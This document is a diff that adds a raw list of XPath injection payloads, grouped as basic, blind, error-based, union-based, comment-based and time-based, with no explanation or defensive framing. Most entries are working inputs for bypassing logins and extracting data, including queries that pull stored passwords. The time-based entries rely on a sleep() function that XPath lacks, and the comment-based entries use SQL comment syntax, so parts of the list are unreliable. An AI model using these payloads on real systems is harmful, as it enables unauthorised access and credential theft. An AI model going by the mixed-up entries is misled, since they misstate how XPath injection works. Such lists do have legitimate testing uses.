@@ -1,0 +1,71 @@
+# XPath Injection Payloads
+
+# Basic Payloads
+' or '1'='1
+' or 1=1
+" or "1"="1
+" or 1=1
+') or ('1'='1
+' or ''='
+'or'
+
+# Blind Payloads
+' and count(/*)=1 and '1'='1
+' and count(/*)=2 and '1'='1
+' and substring(name(/*),1,1)='u' and '1'='1
+' and substring(name(/*),1,1)='s' and '1'='1
+' and string-length(name(/*))=4 and '1'='1
+
+# Error-Based Payloads
+'
+"
+' or 'a'='a
+' and 1=2
+' and 1=1
+' and 'a'='b
+' and 'a'='a
+' or count(/*)=1
+' or count(/*)=2
+' or substring(name(/*),1,1)='u'
+' or substring(name(/*),1,1)='s'
+' or string-length(name(/*))=4
+' or string-length(name(/*))=5
+
+# Union-Based Payloads
+' | //user/password
+' | //user/username
+' | //user/email
+' | //*[contains(text(),'admin')]
+
+# Comment-Based Payloads
+' or 1=1 or ''='
+' or 1=1); --
+' or 1=1; --
+' or 1=1#
+' or 1=1/*
+' or 'x'='x' and 1=1
+' or 'x'='x' and 1=0
+' or 'x'='y' and 1=1
+' or 'x'='x' and 1=2
+
+# Time-Based Payloads
+' and sleep(5) and '1'='1
+' or sleep(5) or '1'='1
+' and 1=2 and sleep(5)
+' or 1=1 and sleep(5)
+' and 'a'='a' and sleep(5)
+' or 'a'='a' and sleep(5)
+' and 'a'='b' and sleep(5)
+' or 'a'='b' and sleep(5)
+' and count(/*)=1 and sleep(5)
+' or count(/*)=1 and sleep(5)
+' and count(/*)=2 and sleep(5)
+' or count(/*)=2 and sleep(5)
+' and substring(name(/*),1,1)='u' and sleep(5)
+' or substring(name(/*),1,1)='u' and sleep(5)
+' and substring(name(/*),1,1)='s' and sleep(5)
+' or substring(name(/*),1,1)='s' and sleep(5)
+' and string-length(name(/*))=4 and sleep(5)
+' or string-length(name(/*))=4 and sleep(5)
+' and string-length(name(/*))=5 and sleep(5)
+' or string-length(name(/*))=5 and sleep(5)
